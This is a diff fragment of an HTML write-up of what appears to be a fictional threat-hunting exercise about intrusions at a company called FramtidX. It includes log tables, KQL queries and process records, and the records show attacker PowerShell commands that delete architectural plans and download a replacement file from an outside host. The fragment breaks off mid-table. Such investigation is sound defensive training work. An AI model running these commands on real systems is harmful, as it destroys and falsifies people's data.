+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/projects</td>
+                    <td>https://www.linkedin.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:42:28.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/projects/current</td>
+                    <td>https://www.linkedin.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:42:46.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/projects/new-mall</td>
+                    <td>https://www.linkedin.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:42:53.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/projects/secret</td>
+                    <td>https://www.findevilcorps.net</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:43:15.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/projects/marshland-exploitation</td>
+                    <td>https://www.findevilcorps.net</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:44:11.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/projects/world-domination</td>
+                    <td>https://www.findevilcorps.net</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:44:50.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/news</td>
+                    <td>https://www.findevilcorps.net</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:45:35.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/news/press-releases</td>
+                    <td>https://www.findevilcorps.net</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:45:50.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/news/internal-updates</td>
+                    <td>https://www.findevilcorps.net</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:46:38.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/news/articles/new-mall-project-ahead-of-schedule</td>
+                    <td>https://www.valdoriantimes.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:46:56.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/news/articles/marshland-exploitation-benefits</td>
+                    <td>https://www.valdoriantimes.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:46:59.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/news/articles/ceo-interview-johanna-karlsson</td>
+                    <td>https://www.valdoriantimes.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:47:23.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/news/articles/meet-our-it-admins</td>
+                    <td>https://www.valdoriantimes.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:48:14.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/news/articles/why-frogs-don%27t-matter</td>
+                    <td>https://www.valdoriantimes.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:48:21.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/news/articles/refill-the-swamp</td>
+                    <td>https://www.valdoriantimes.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 10:48:29.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/careers</td>
+                    <td>https://www.valdorianjobs.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 11:34:29.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/careers/opportunities</td>
+                    <td>https://www.valdorianjobs.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 12:05:29.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/careers/team</td>
+                    <td>https://www.valdorianjobs.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 12:09:29.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/careers/become-a-minion</td>
+                    <td>https://www.valdorianjobs.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 12:46:29.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/blog</td>
+                    <td>https://www.valdorianjobs.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 13:14:29.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/blog/company-updates</td>
+                    <td>https://www.valdorianjobs.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 13:34:29.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/blog/posts/behind-the-scenes-it-department</td>
+                    <td>https://www.valdorianjobs.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 14:02:29.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/blog/posts/interview-with-johanna-karlsson</td>
+                    <td>https://www.valdorianjobs.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 14:06:29.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/blog/posts/future-projects-and-developments</td>
+                    <td>https://www.valdorianjobs.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-20 14:20:29.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/blog/posts/how-to-hide-your-evil-plans</td>
+                    <td>https://www.valdorianjobs.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 10:29:56.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/documents</td>
+                    <td>https://microsoftonline.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 10:30:47.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/emails</td>
+                    <td>https://msn.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 10:31:41.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/architectural_plans</td>
+                    <td>https://linkedin.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 10:32:18.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/it_infrastructure</td>
+                    <td>https://pinterest.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 11:11:44.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/documents</td>
+                    <td>https://duckduckgo.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 11:11:51.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/emails</td>
+                    <td>https://discord.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 11:11:53.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/architectural_plans</td>
+                    <td>https://sharepoint.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 11:12:25.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/it_infrastructure</td>
+                    <td>https://duckduckgo.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 11:29:30.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/documents</td>
+                    <td>https://duckduckgo.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 11:29:39.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/emails</td>
+                    <td>https://fandom.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 11:30:28.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/architectural_plans</td>
+                    <td>https://openai.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 11:30:37.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/it_infrastructure</td>
+                    <td>https://okta.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 12:14:51.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/documents</td>
+                    <td>https://duosecurity.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 12:15:49.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/emails</td>
+                    <td>https://wikipedia.org</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 12:15:53.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/architectural_plans</td>
+                    <td>https://instagram.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 12:15:58.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/it_infrastructure</td>
+                    <td>https://google.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 12:37:07.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/documents</td>
+                    <td>https://duosecurity.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 12:37:54.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/emails</td>
+                    <td>https://linktr.ee</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 12:38:14.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/architectural_plans</td>
+                    <td>https://microsoft.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 12:38:28.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/it_infrastructure</td>
+                    <td>https://wikipedia.org</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 12:48:26.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/documents</td>
+                    <td>https://twitch.tv</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 12:48:42.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/emails</td>
+                    <td>https://google.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 12:49:27.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/architectural_plans</td>
+                    <td>https://ebay.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 12:50:18.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/it_infrastructure</td>
+                    <td>https://t.co</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 13:46:57.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/documents</td>
+                    <td>https://twitch.tv</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 13:47:47.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/emails</td>
+                    <td>https://discord.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 13:48:27.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.37</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/architectural_plans</td>
+                    <td>https://duckduckgo.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-21 13:48:43.0000</td>
+                    <td>GET</td>
+                    <td>239.72.6.38</td>
+                    <td>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_3; rv:1.9.6.20) Gecko/2022-06-30 19:57:20 Firefox/3.6.11</td>
+                    <td>https://framtidxdevcorp.com/internal/it_infrastructure</td>
+                    <td>https://facebook.com</td>
+                    <td>200</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>There are quite a lot of results; the first batch of queries--dating to 2024-06-20--are all about looking for controversies regarding FramtidX's activities, including damage against local frog populations, alleged shady deals, alleged offshore accounts, alleged briberies, any whistleblower incidents, etcetera. They also looked for ways to contact FramtidX's IT staff, if there exists a public-facing employee email directory, how to contact developers, if there are any public-facing internal document repositories, IT infrastructure details, any existing backdoors in FramtidX's IT infrastructure, etcetera. They also browsed the "about us" and specific employee pages, such as CEO Johanna Karlsson's, current and historic projects, press releases, the careers page, an article about FramtidX's IT team, etcetera.</p>
+          <p>The next day, they accessed internal directories containing emails, documents, architectural plans, and IT architecture. Interestingly, the refferers for these accesses include popular social media websites, OpenAI, common search engines, and services such as <samp>valdoriantimes.com</samp>, <samp>valdorianjobs.com</samp> and <samp>findevilcorps.net</samp>; the most frequent external refferer is <samp>valdorianjobs.com</samp>, followed by <samp>linkedin.com</samp>. At this time, they had access to Developer Alex Johnson's account; before following on that, I'd like to confirm what--if anything--the threat actor did on the chief architects' devices.</p>
+          <pre><kbd>Employees
+| where role =~ "chief architect"
+| distinct hostname
+| lookup ProcessEvents on $left.hostname == $right.hostname
+| where timestamp >= datetime(2024-06-27 10:35:54.0000) //when Erik got compromised (Sofia was shortly after)
+and process_commandline !contains ("WindowsApps")
+and process_commandline !contains ("SystemApps")
+| sort by hostname, timestamp asc </kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <caption>This table has been redacted; it only shows the most relevant findings, rather than the entire output of the KQL query above.</caption>
+                <thead>
+                  <tr>
+                    <th>hostname</th>
+                    <th>timestamp</th>
+                    <th>parent_process_name</th>
+                    <th>parent_process_hash</th>
+                    <th>process_commandline</th>
+                    <th>process_name</th>
+                    <th>process_hash</th>
+                    <th>username</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>VJVS-MACHINE</td>
+                    <td>2024-07-09 15:58:46.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>Remove-Item C:\Users\solindgren\Documents\SuperImportantMallProjectArchitecturalPlans.docx</td>
+                    <td>powershell.exe</td>
+                    <td>d1ed187d85902d679e2926303c291bfa391aa1b4e32b59ae744fbf4ff892f554</td>
+                    <td>solindgren</td>
+                  </tr>
+                  <tr>
+                    <td>VJVS-MACHINE</td>
+                    <td>2024-07-10 12:50:15.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>Invoke-WebRequest -Uri https://newdevelopmentupdates.org/fake_plans.docx -OutFile C:\Users\solindgren\Documents\fake_plans.docx</td>
+                    <td>powershell.exe</td>
+                    <td>39d2fa1fba52e8cc137c5947672cf150632443b9cd196d3ad7240cfd92923d43</td>
+                    <td>solindgren</td>
+                  </tr>
+                  <tr>
+                    <td>VJVS-MACHINE</td>
+                    <td>2024-07-10 13:43:15.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>Rename-Item -Path C:\Users\solindgren\Documents\fake_plans.docx -NewName SuperImportantMallProjectArchitecturalPlans.docx</td>
+                    <td>powershell.exe</td>
+                    <td>0a43dc1485830d568cdf63d557fbffe4c6f188ec2e95e54ff3d419d6a7589501</td>
+                    <td>solindgren</td>
+                  </tr>
+                  <tr>
+                    <td>LRJP-DESKTOP</td>
+                    <td>2024-07-09 14:23:50.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>Remove-Item C:\Users\erbjorn\Documents\SuperImportantMallProjectArchitecturalPlans.docx</td>
+                    <td>powershell.exe</td>
+                    <td>e3f9d770e6c24534e68c3084f0d7f3ceaaaf7991a624736aa0636f4819a0eeb4</td>
+                    <td>erbjorn</td>
+                  </tr>
+                  <tr>
+                    <td>LRJP-DESKTOP</td>
+                    <td>2024-07-09 14:39:50.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>Invoke-WebRequest -Uri https://newdevelopmentupdates.org/fake_plans.docx -OutFile C:\Users\erbjorn\Documents\fake_plans.docx</td>
+                    <td>powershell.exe</td>
+                    <td>debdcab77ca53b6b441c2debf37a60a74cd982cb889441917a0303daf6273f3d</td>
+                    <td>erbjorn</td>
+                  </tr>
+                  <tr>
+                    <td>LRJP-DESKTOP</td>
+                    <td>2024-07-09 15:22:50.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>Rename-Item -Path C:\Users\erbjorn\Documents\fake_plans.docx -NewName SuperImportantMallProjectArchitecturalPlans.docx</td>
+                    <td>powershell.exe</td>
+                    <td>9d2c8d40ffcb5db6c9c91b1725ec44bf46f943f2fb0bc15c13f31c762657b8bc</td>
+                    <td>erbjorn</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>On both their devices, the threat actors deleted the file <samp>SuperImportantMallProjectArchitecturalPlans.docx</samp> and replaced it with a dummy file originally named <samp>fake_plans.docx</samp>; they renamed it the same as the original file. If there were no backups in place, the file has been lost; this is an example of data manipulation [<a href="https://attack.mitre.org/techniques/T1565/">MITRE ATT&amp;CK</a>].</p>
+          <p>Last but not least, the CEO, Johanna Karlsson was also compromised--certainly a valuable target for Shadow Truth, whom specifically looked for information on her during their recon (see <a href="">[X]</a>)--I will take the time to explore what they could've done inside her mailbox and devices in the next section.</p>
+        </section> <!--section 3-->
+        <section id="section4"><!--section 4-->
+          <h3>Section 4 - Nope, it’s a full on frognado!!!! 🐸🌪️😱</h3>
+          <p>As seen in <a href="">[X]</a>, CEO Johanna Karlsson was among the FramtidX employees targeted by a spearphishing campaign that used Developer Alex Johnson's email account, thus bypassing any security measures meant to protect against suspicious external emails. Prompted with an allegedly urgent security update and given a link to a fake login page, Johanna Karlsson had her credentials compromised on 2024-06-26 at 14:34:22 in the afternoon; on 2024-06-27 at 12:40:59 in the afternoon, the threat actors--using IP address <samp>239.72.6.38</samp>--successfully logged into Johanna's computer. To check what they could've done on it, I use:</p>
+          <pre><kbd>Employees
+| where role =~ "ceo"
+| distinct hostname
+| lookup ProcessEvents on $left.hostname == $right.hostname
+| where timestamp >= datetime(2024-06-27 12:40:59.0000) //when Johanna got compromised
+and process_commandline !contains ("WindowsApps")
+and process_commandline !contains ("SystemApps")</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <caption>This table has been redacted; it only shows the most relevant findings, rather than the entire output of the KQL query above.</caption>
+                <thead>
+                  <tr>
+                    <th>hostname</th>
